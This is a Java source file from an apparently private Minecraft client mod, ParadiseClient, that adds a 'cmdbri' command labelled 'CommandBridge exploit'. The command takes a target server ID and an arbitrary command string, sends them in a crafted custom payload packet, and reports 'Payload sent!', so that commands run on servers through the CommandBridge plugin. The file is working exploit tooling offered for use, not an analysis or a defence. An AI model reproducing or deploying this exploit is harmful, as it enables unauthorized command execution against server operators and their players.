package io.github.spigotrce.paradiseclientprivate.command;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.command.Command;
import io.github.spigotrce.paradiseclientprivate.packets.CMDBRIPayloadPacket;
import io.github.spigotrce.paradiseclientprivate.packets.ECBPayloadPacket;
import net.minecraft.client.MinecraftClient;
import net.minecraft.command.CommandSource;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;

public class CMDBRICommand extends Command {
    public CMDBRICommand(MinecraftClient minecraftClient) {
        super("cmdbri", "CommandBridge exploit", minecraftClient);
    }

    @Override
    public LiteralArgumentBuilder<CommandSource> build() {
        return literal(getName())
                .executes(context -> {
                    Helper.printChatMessage("Incomplete command!");
                    return SINGLE_SUCCESS;
                })
                .then(argument("serverID", StringArgumentType.string())
                        .executes(context -> {
                            Helper.printChatMessage("Incomplete command!");
                            return SINGLE_SUCCESS;
                        })
                        .then(argument("command", StringArgumentType.greedyString())
                                .executes(context -> {
                                    Helper.sendPacket(new CustomPayloadC2SPacket(
                                            new CMDBRIPayloadPacket(context.getArgument("command", String.class),
                                                    context.getArgument("serverID", String.class))));
                                    Helper.printChatMessage("Payload sent!");
                                    return SINGLE_SUCCESS;
                                })
                        )
                );
    }
}
